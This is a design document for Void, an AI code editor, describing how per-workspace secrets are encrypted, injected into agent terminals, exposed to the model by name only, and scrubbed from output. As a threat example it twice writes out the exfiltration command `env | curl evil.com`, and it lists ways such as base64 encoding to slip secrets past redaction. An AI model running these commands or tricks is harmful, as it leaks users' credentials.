# Workspace env vars (soft isolation)

## Problem

The LLM provider may apply output guardrails that block literal API keys / secrets
in tool calls. But the agent genuinely needs secrets in commands — `curl` with an
auth header, `gh` with a token, `aws` with credentials. Today there is no clean way
to give the agent access to a secret without the secret value flowing through the
model's prompt, output, persisted chat history, and provider-side request logs.

What exists today:

- VS Code's `terminal.integrated.inheritEnv` (default `true`) sources `~/.zshrc` /
  `~/.bashrc` etc., so globally-exported secrets are already available to Void's
  terminals. The agent can already write `$OPENAI_API_KEY` and the shell expands it.
- But this is global and invisible: every terminal (Void-spawned or user-opened) sees
  them, the agent doesn't know which names are safe to reference, and there's no
  per-workspace scoping for project-specific secrets.

## Solution

Soft isolation: store per-workspace env vars in encrypted secret storage, inject
them only into Void-spawned terminals via `IShellLaunchConfig.env`, and advertise
their **names** (never values) to the LLM in the volatile context block. The model
references them by `$VAR_NAME`; the shell expands at runtime; the literal value
never enters model context.

This does **not** prevent a malicious model from running `env | curl evil.com` —
the terminal still inherits base shell env (PATH, HOME, etc.) so tools like
nvm/pyenv keep working. That's a deliberate trade-off (see *Soft vs hard isolation*
below). What it does solve: guardrail never sees a key, secrets never enter chat
history or provider logs, and access is workspace-scoped.

## Variant model (multiple values, one active)

A single var name can have multiple stored **variants** (e.g. `OPENAI_API_KEY`
with `prod` / `staging` / `test`). Exactly one variant is **active** per var at a
time; only the active variant's value is injected into terminals and advertised
to the model. Switching variants is a one-click action in the management UI.

This mirrors how users actually work with secrets: same code, same var name,
different values per environment. The model doesn't need to know about inactive
variants — it just sees `OPENAI_API_KEY` is available and writes
`$OPENAI_API_KEY`. The human picks which value backs that name.

## Architecture

### 1. Storage (two tiers, following the secret-storage pattern)

**Metadata — plaintext, `IStorageService`, `StorageScope.WORKSPACE`.**

Key: `void.workspaceEnvVars`. Value: a JSON tree describing var names, their
variants, and which variant is active. Values are NOT stored here — only labels
and structure.

```typescript
type EnvVarVariantMeta = {
	id: string       // stable uuid; key into the values blob
	label: string    // human-readable, e.g. "prod" / "staging" / "personal"
	createdAt: number
}

type EnvVarEntry = {
	variants: EnvVarVariantMeta[]   // insertion order; first is default-active on creation
	activeVariantId: string         // points into variants[].id
}

// map keyed by VAR_NAME (e.g. "OPENAI_API_KEY")
type WorkspaceEnvVars = Record<string, EnvVarEntry>
```

This mirrors the existing terminal-allowlist storage pattern
(`TERMINAL_AUTO_APPROVE_KEY` in `storageKeys.ts`, also WORKSPACE-scoped). The
metadata isn't secret — var names and labels are surfaced to the model anyway via
the advertisement block, so storing them in plaintext is consistent.

**Values — encrypted, `ISecretStorageService`, `StorageScope.APPLICATION`.**

One blob per workspace: `void.envVar.<workspaceHash>` → encrypted JSON of
`{ VAR_NAME: { variantId: value } }`. The whole values tree lives under a single
secret-storage key.

- `ISecretStorageService` (`src/vs/platform/secrets/common/secrets.ts`) encrypts
  at rest via `IEncryptionService` (mac Keychain on macOS). APPLICATION scope is
  the only scope the secret service supports — that's why the key is namespaced
  with `workspaceHash` to give per-workspace isolation.
- `workspaceHash` is a stable hash of the workspace URI (same computation the
  terminal-allowlist could use if it ever needs to move to secret storage). It
  is NOT secret — it's just a partition key.
- **One blob, not one key per variant.** Reads vastly outnumber writes: the
  scrubber fires on every `runCommand` / `readTerminal` result, while writes
  happen only on interactive management. One decrypt per read beats N decrypts
  (one per variant). The cost is read-modify-write on writes (decrypt → merge →
  reencrypt), but writes are rare, interactive, and serialized by
  `ISecretStorageService`'s `SequencerByKey`.
- **Switching the active variant is still a plaintext-only op** —
  `activeVariantId` lives in the metadata, not the values blob, so flipping it
  touches zero secret bytes. Same benefit as the per-variant design, without
  the read penalty.
- **Corruption blast radius is the whole workspace's values.** A decrypt
  failure clears the blob to empty (the auto-`delete()` in `secrets.ts:105`
  handles this); re-entry is a one-time cost. Acceptable — Keychain corruption
  is rare, and this is a workspace-local setback, not a global one.

`ISecretStorageService` is not currently injected anywhere in Void — the
commented-out reference in `voidSettingsService.ts:265` is the only existing
mention. We add a new injection site in `TerminalToolService` and the new
`WorkspaceEnvVarService`.

### 2. Terminal injection

In `TerminalToolService._createTerminal` (`terminalToolService.ts:197`), after
building `options` and before `terminalService.createTerminal(options)`:

1. Read the workspace's `WorkspaceEnvVars` metadata from plaintext storage.
2. Fetch the single encrypted values blob from `ISecretStorageService`
   (one decrypt), and for each var name look up its active variant's value.
3. Merge into `options.config.env` (which is `ITerminalEnvironment` on
   `IShellLaunchConfig`, see `src/vs/platform/terminal/common/terminal.ts:519`).
   `env` is *merged* on top of the inherited shell env — existing global exports
   (PATH, HOME, nvm vars) are preserved.

Only Void-spawned terminals (the ones `_createTerminal` creates — both the
hidden temporary ones and the persistent ones) get the injected vars. A terminal
the user opens manually via the `+` button in the terminal panel does **not** go
through `_createTerminal`, so it does not see the workspace env vars. That's the
soft-isolation boundary: workspace secrets live in Void's agent terminals only.

The fetch is async (secret storage decrypts lazily). `_createTerminal` is
already async, so we `await` the secret reads before creating the terminal.
Failure to decrypt a single var (e.g. Keychain locked, value deleted) logs a
warning and skips that var — terminal creation must not fail because one secret
is unreadable.

### 3. LLM advertisement

In `generateChatVolatileContext` (the per-turn volatile block in
`ConvertToLLMMessageService` — already carries active file, open files, date,
terminals; rebuilt every request, NOT persisted into chat history), append:

```
AVAILABLE_ENV_VARS:
- OPENAI_API_KEY (active: prod)
- STRIPE_SECRET_KEY (active: test)

These are available as $VAR_NAME in terminal commands. Reference them by name;
never output or hardcode secret values.
```

- **Names only, never values.** The model learns which vars exist and can write
  `$OPENAI_API_KEY` in commands. It never sees the secret bytes.
- **Active variant label is shown** so the model (and user, reading the bubble)
  knows *which* environment is live. Useful when the user asks "make sure this
  hits staging, not prod" — the model can sanity-check the active label.
- **Volatile block, not system message, not persisted history.** This is the
  right layer: it's per-turn context that reflects the *current* workspace state,
  and changing the active variant takes effect on the next turn without touching
  the cacheable system message or rewriting history.

### 4. Output scrubbing

Terminal output flows back to the model as a tool result. Without scrubbing, the
"secret never enters model context" guarantee is broken the moment any command's
output contains an injected value. Three leak patterns:

1. **Direct echo** — `echo $OPENAI_API_KEY`, `env`, `printenv`,
   `node -e "console.log(process.env)"`. A model following instructions might
   still do this "to check the var is set," and a legitimate debug command
   can print env.
2. **Verbose errors** — `curl -v` echoes expanded request headers including
   `Authorization: Bearer <real key>` into stderr. The model runs `curl -v`
   for debugging and the key lands in the result.
3. **Introspection dumps** — `env`, `set`, `printenv` list everything,
   including our injected values.

**Mechanism:** at the points in `TerminalToolService` where output strings are
produced (`runCommand`'s result construction, `readTerminal`,
`readTerminalByName`), replace each known secret value with
`[REDACTED:VAR_NAME]`.

- **Scrub all variant values, not just the active one.** A terminal created
  with variant A (prod) keeps that value in its env even after the user
  switches to variant B. Scrubbing every stored variant value covers terminals
  created under any past active variant without tracking per-terminal injection
  history.
- **Replacement names the var** — the model sees `[REDACTED:OPENAI_API_KEY]`
  and knows the var is set and was echoed, without seeing the value. Better
  than a generic `[REDACTED]` which leaves the model guessing.
- **New service method** — `IWorkspaceEnvVarService.getAllEnvValues()`
  returns `{ name, value }[]` for *every* variant, active or not. Both it and
  `getActiveEnv()` read from the single encrypted values blob (one decrypt);
  `getAllEnvValues` flattens every variant, `getActiveEnv` filters to the
  active variant per var. The scrubber calls `getAllEnvValues` once per
  terminal-result construction and does a plain string replacement of each
  value with `[REDACTED:NAME]`.

**Honest gaps (consistent with soft isolation):**

- **Transformations defeat it.** `echo $KEY | base64`, `rev | rev`,
  URL-encoding, splitting across lines. Exact-match scrubbing can't catch
  these; only `strictEnv` (hard isolation) keeps the value out of the
  terminal env entirely.
- **Global rc vars aren't scrubbed.** Anything `~/.zshrc` exports that isn't
  in our workspace env store still shows up in `env` output. Out of scope for
  soft isolation; if this matters, it's the trigger to move to strictEnv.
- **Provider input guardrail remains the backstop.** If a transformed value
  reaches the outgoing command, the provider's filter catches the literal
  pattern. We don't reimplement pattern-based secret detection on our side —
  value-based scrubbing is precise and complete for *our* secrets (the set
  we're responsible for); the provider handles the rest of the surface.

### 5. Management UI

A new action in `sidebarActions.ts`, sibling to `void.terminalManageAllowlist`
(the shield button added in the auto-approve work). Icon: `Codicon.key`
(superset of `Codicon.shield` for "this view manages secrets"). Opens a
QuickPick with three flows:

- **List view** — shows each var as `{VAR_NAME} (active: {label})`. Selecting
  one drills into variant management for that var.
- **Add var** — prompt for name (must match `^[A-Z_][A-Z0-9_]*$`), then prompt
  for first variant label + value. Creates the entry with one variant, marked
  active.
- **Add variant to existing var** — prompt for label + value. Does NOT change
  the active variant (user explicitly switches).
- **Switch active variant** — sub-pick of variants for a var; selecting one
  flips `activeVariantId` in the plaintext metadata. No secret bytes touched.
- **Remove** — multi-select removal. Deleting a var (or a single variant)
  updates the plaintext metadata AND rewrites the encrypted values blob with
  the removed entries dropped (read-modify-write, serialized by
  `ISecretStorageService`'s sequencer). Best-effort: if the blob decrypt
  fails, metadata is still updated and the dangling blob self-clears on next
  read via the auto-`delete()` in `secrets.ts`.

Values are **never displayed** in the UI — only labels. Adding/switching prompts
for a fresh value via `IQuickInputService.input` with `password: true` masking.
This matches how VS Code itself handles GitHub auth token entry.

## Service shape

New `IWorkspaceEnvVarService` in `src/vs/workbench/contrib/void/browser/workspaceEnvVarService.ts`,
mirroring the `TerminalToolService` singleton pattern:

```typescript
export interface IWorkspaceEnvVarService {
	readonly _serviceBrand: undefined

	// Metadata (plaintext, workspace-scoped)
	getVars(): WorkspaceEnvVars
	addVar(name: string, firstVariantLabel: string, firstVariantValue: string): Promise<void>
	addVariant(name: string, label: string, value: string): Promise<void>
	setActiveVariant(name: string, variantId: string): void
	removeVar(name: string): Promise<void>
	removeVariant(name: string, variantId: string): Promise<void>

	// Resolved env for terminal injection (active variants only,
	// called by TerminalToolService._createTerminal). Reads the single
	// encrypted values blob (one decrypt).
	getActiveEnv(): Promise<Record<string, string>>  // VAR_NAME -> value

	// All variant values (active + inactive), name + value pairs.
	// Called by the output scrubber in TerminalToolService so terminals
	// created under a now-inactive variant still get scrubbed. Same single
	// blob read as getActiveEnv, flattened to all variants.
	getAllEnvValues(): Promise<{ name: string, value: string }[]>

	// Resolved names + active labels for LLM advertisement
	// (called by ConvertToLLMMessageService — names only, no values)
	getActiveVarDescriptors(): { name: string, activeLabel: string }[]
}
```

- `getActiveEnv()` and `getAllEnvValues()` both read the single encrypted
  values blob (one decrypt each); `getActiveEnv` is called once per
  `_createTerminal`, `getAllEnvValues` once per terminal-result construction
  by the output scrubber.
- `getActiveVarDescriptors()` is cheap (plaintext-only) and called once per turn
  in `generateChatVolatileContext`.
- `TerminalToolService` depends on `IWorkspaceEnvVarService`;
  `ConvertToLLMMessageService` depends on it too. Both already live in the
  workbench contrib layer so there's no layering issue.

## Soft vs hard isolation

This design is **soft isolation**:

- The model is *told* only the allowlisted var names.
- Secret values exist only in Void-spawned terminals (not user-opened shells).
- The terminal still inherits base shell env so nvm/pyenv/etc. keep working.

What it does **not** prevent: a determined model running `env | curl evil.com` to
exfiltrate global rc vars (`PATH`-injected tokens, `NVM_DIR`-resolved values,
anything `~/.zshrc` exports). Workspace-scoped vars are also exfiltrable this
way — they're in the terminal's env.

**Hard isolation** — preventing that — requires `strictEnv: true` on the shell
launch config + a hand-curated base env (PATH, HOME, USER, SHELL, LANG, TMPDIR,
TERM, plus the workspace vars) with everything else stripped. This genuinely
blocks exfiltration but breaks any tool that relies on a global rc var. That's
the Cursor-sandbox path; it's a larger, riskier project that gates on a real
exfiltration concern emerging.

The storage layer designed here (metadata + encrypted values + per-variant
model) is identical for both soft and hard isolation — `strictEnv` is an
additive flag on `_createTerminal` that can be added later without restructuring
storage. Ship soft now; harden later if needed.

## Open questions

- **Workspace hash stability across moves** — if a workspace folder is moved,
  its URI changes, the hash changes, and the secret-storage keys no longer match
  the metadata. Mitigation: on first `getActiveEnv()` failure to find a value,
  surface a notification ("workspace env vars need re-entry after move"). A
  migration path (re-key by a stable workspace id rather than URI hash) is
  possible but deferred until this actually bites someone.
- **Shared vs per-workspace** — some vars (like a personal GitHub token) are
  useful across all workspaces. Current design is per-workspace only. If this
  becomes friction, add a `scope: 'workspace' | 'global'` flag on each var entry;
  global vars use a fixed `__global__` partition key instead of `workspaceHash`.
  Defer until users ask.
- **Thread-level scope** — explicitly out of scope for v1. Workspace matches
  `.env` convention and the existing terminal allowlist. Thread-level adds a
  dimension of complexity (which thread's vars win when switching threads?)
  with little concrete benefit.
